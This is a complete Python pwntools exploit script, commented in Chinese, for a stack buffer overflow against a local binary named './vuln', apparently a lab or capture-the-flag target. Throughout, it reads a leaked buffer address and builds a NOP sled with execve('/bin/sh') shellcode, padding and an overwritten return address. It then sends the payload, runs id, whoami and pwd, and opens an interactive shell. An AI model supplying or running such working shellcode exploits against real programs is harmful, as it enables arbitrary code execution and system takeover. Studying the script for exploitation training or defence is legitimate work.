# exploit.py
from pwn import *

# 启用调试输出
context.log_level = 'debug'
context.arch = 'amd64'
context.bits = 64
context.terminal = ['gnome-terminal', '-e']

# 设置程序路径
binary = './vuln'

# 启动程序
p = process(binary)

# 接收程序输出直到缓冲区地址
p.recvuntil(b'Buffer address: ')
buffer_addr = int(p.recvline().strip(), 16)
print(f"[+] Buffer address: {hex(buffer_addr)}")

# 使用更简单的shellcode
shellcode = b"\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"
print(f"[+] Shellcode length: {len(shellcode)} bytes")

# 构造攻击载荷
nop_sled = b"\x90" * 64
padding = b"A" * (128 + 8 - len(nop_sled) - len(shellcode))
ret_addr = p64(buffer_addr + len(nop_sled))

payload = nop_sled + shellcode + padding + ret_addr

print(f"[+] Payload length: {len(payload)} bytes")
print(f"[+] Return address: {hex(buffer_addr + len(nop_sled))}")

# 发送攻击载荷
print("[+] Sending payload...")
p.sendline(payload)

# 尝试执行一些命令
print("[+] Trying to execute commands...")
p.sendline(b"id")
p.sendline(b"whoami")
p.sendline(b"pwd")

# 获取shell
print("[+] Getting shell...")
p.interactive()